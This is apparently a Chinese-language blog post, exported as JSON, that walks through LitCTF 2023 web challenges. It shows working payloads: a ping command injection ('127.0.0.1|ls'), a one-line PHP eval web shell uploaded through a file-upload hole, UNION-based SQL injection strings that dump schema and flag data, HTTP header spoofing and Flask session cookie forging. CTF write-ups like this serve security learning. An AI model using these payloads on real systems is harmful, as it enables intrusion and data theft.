{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"Litctf 2023","date":"2023-05-18T15:28:20.915Z","updated":"2023-05-18T15:29:28.223Z","comments":true,"path":"api/articles/Litctf 2023.json","keywords":null,"cover":[],"content":"<p><strong>1.我Flag呢？</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0//all_picture/Litctf_1.png\"></p>\n<p><strong>2.导弹迷踪</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0//all_picture/Litctf_2.png\"></p>\n<p><strong>3.Follow me and hack me</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_3.png\"></p>\n<p><strong>4.Ping</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_4_1.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_4_2.png\"><br>前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_4_3.png\"><br>并将抓到的包进行我们需要的修改，”127.0.0.1|ls”，执行ls命令,可以执行,<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_4_4.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_4_5.png\"><br>发现flag文件,直接cat，就可以读取<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_4_6.png\"></p>\n<p><strong>5.PHP是世界上最好的语言！！</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_5_1.png\"><br>题目提示flag位于根目录，直接去根目录找就行，然后直接cat就能拿到flag<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_5_2.png\"></p>\n<p><strong>6.作业管理系统</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_6_1.png\"><br>查看页面源代码，提示默认账户admin admin，登录进入作业管理系统，发现上传文件的功能，猜测存在文件上传漏洞，上传php一句话木马，</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_6_2.png\"><br>使用蚁剑连接，访问上传木马1.php，连接成功，<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_6_3.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_6_4.png\"><br>发现根目录下存在flag文件，读取flag文件得到flag<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_6_5.png\"></p>\n<p><strong>7.Vim yyds</strong><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_7_1.png\"><br>访问xxx&#x2F;.index.php.swp下载泄露的备份文件<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_7_2.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_7_3.png\"><br>整理后的代码如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nerror_reporting(0);             \n$password &#x3D; &quot;Give_Me_Your_Flag&quot;;             \necho &quot;&lt;p&gt;can can need Vim &lt;&#x2F;p&gt;&quot;;             \n&#123;             \nif ($_POST[&#39;password&#39;] &#x3D;&#x3D;&#x3D; base64_encode($password)) \necho &quot;&lt;p&gt;Oh You got my password!&lt;&#x2F;p&gt;&quot;;             \neval(system($_POST[&#39;cmd&#39;]));                 \n&#125;                 \n?&gt;             </code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_7_4.png\"><br>按照要求post提交password和cmd，在根目录发现flag<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_7_5.png\"></p>\n<p><strong>8.这是什么？SQL ！注一下 ！</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1)))))) or 1&#x3D;1#</code></pre>\n\n<p>然后,恭喜你，就得到了一个假的flag。<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_1.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1)))))) order by 2 #</code></pre>\n\n<p>输入3返回值为0，<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_2.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1)))))) union select 1,group_concat(schema_name) from information_schema.schemata#</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_3.png\"><br>爆库：information_schema,mysql,ctftraining,performance_schema,test,ctf</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;ctftraining&quot;#</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_4.png\"><br>爆表：flag,news,users</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;flag&quot;#</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_5.png\"><br>爆列名：flag</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1)))))) union select 1,group_concat(flag) from ctftraining.flag#</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_6.png\"></p>\n<p><strong>9.Http pro max plus</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_1.png\"></p>\n<p>可恶，加了个xff。被嘲讽了。不过没关系，还有很多办法。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">client-ip: 127.0.0.1</code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_2.png\"></p>\n<p>emmm，也许还有更简单粗暴的方法，但是。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer:pornhub.com</code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_3.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-Agent: Chrome</code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_4.png\"></p>\n<p>代理的请求头：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_6.png\"></p>\n<p>HTTP请求头大全,HTTP头信息包括通用头、请求头、响应头和实体头四个部分：<a href=\"https://stackoverflow.org.cn/httpheader/\">https://stackoverflow.org.cn/httpheader/</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">via: Clash.win</code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_5.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_7.png\"></p>\n<p>三个链接我帮大家都看过了，没有好康的，但是拿到flag就不亏。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_9_8.png\"></p>\n<p><strong>10.1zjs</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_10_1.png\"></p>\n<p>是f1ag，不是flag，慢慢找吧，js代码有点多。<br>然后访问&#x2F;<a href=\"mailto:&#102;&#x40;&#x6b;&#x33;&#102;&#49;&#97;&#x67;&#46;&#x70;&#104;&#x70;\">&#102;&#x40;&#x6b;&#x33;&#102;&#49;&#97;&#x67;&#46;&#x70;&#104;&#x70;</a>，把代码全部复制到控制台回车。<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_10_2.png\"><br>js fuck：<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_10_3.png\"></p>\n<p><strong>11.就当无事发生</strong><br>社工题，给了链接<a href=\"https://probiusofficial.github.io,打开后发现是探姬的博客,翻到最底下hexo,搭建过博客就想到github(唔,加上背景图片博客很好看,但是我截图的时候图片没加载出来)/\">https://ProbiusOfficial.github.io，打开后发现是探姬的博客，翻到最底下hexo，搭建过博客就想到github（唔，加上背景图片博客很好看，但是我截图的时候图片没加载出来）</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_11_1.png\"></p>\n<p>利用github搭建的hexo博客有固定格式：<a href=\"https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/\">https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_11_2.png\"></p>\n<p>历史记录有删掉的版本，不出意外就在这里面就有flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_11_3.png\"></p>\n<p><strong>12.Flag点击就送！</strong><br>flask-session-cookie-manager工具下载：<a href=\"https://github.com/noraj/flask-session-cookie-manager\">https://github.com/noraj/flask-session-cookie-manager</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">usage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s &lt;string&gt;, --secret-key &lt;string&gt;\n                        Secret key\n  -t &lt;string&gt;, --cookie-structure &lt;string&gt;\n                        Session cookie structure</code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_12_1.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_12_2.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_12_3.png\"></p>\n<p><strong>13.彩蛋</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">彩蛋分布于  Follow me and hack me  作业管理系统 狠狠的注入 四个题目 中</code></pre>\n\n<p>1.我Flag呢:在script.min.js可以找到。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_13_1.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">LitCTF&#123;First_t0_The_k3y! (1&#x2F;?) </code></pre>\n\n<p>2.作业管理系统：<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_13_4.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_13_3.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">_S0_ne3t? (2&#x2F;?)</code></pre>\n\n<p>3.Follow me and hack me:</p>\n<p>提示说有备份文件很好吃。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">备份文件常见的后缀名:\n.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n常见的网站源码备份文件名：\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp</code></pre>\n\n<p><a href=\"http://www.zip,手动尝试吧,脚本没跑出来,全是200./\">www.zip，手动尝试吧，脚本没跑出来，全是200。</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_13_2.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">_R3ady_Pl4yer_000ne_ (3&#x2F;?)</code></pre>\n\n<p>4.狠狠的注入:<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/Litctf_8_1.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">F1rst_to_Th3_eggggggggg!&#125; (4&#x2F;4)</code></pre>\n\n<p>all.四个合在一起得到彩蛋的完整flag：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">NSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;</code></pre>","feature":true,"text":"1.我Flag呢？ 2.导弹迷踪 3.Follow me and hack me 4.Ping前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）并将抓到的包进行我们需要的修改，...","link":"","photos":[],"count_time":{"symbolsCount":"3.2k","symbolsTime":"3 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","uid":"3137c2b6b2ca0e39e8c62639d966b498","slug":"ssti1","date":"2023-04-21T10:49:36.000Z","updated":"2023-05-12T11:06:34.813Z","comments":true,"path":"api/articles/ssti1.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/2.jpg","text":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统 漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互 flask是基于python开发的一种web框架，那么也就意味着如果用户可...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"23 mins."},"categories":[{"name":"文章","slug":"文章","count":2,"path":"api/categories/文章.json"}],"tags":[{"name":"ssti模板注入","slug":"ssti模板注入","count":2,"path":"api/tags/ssti模板注入.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}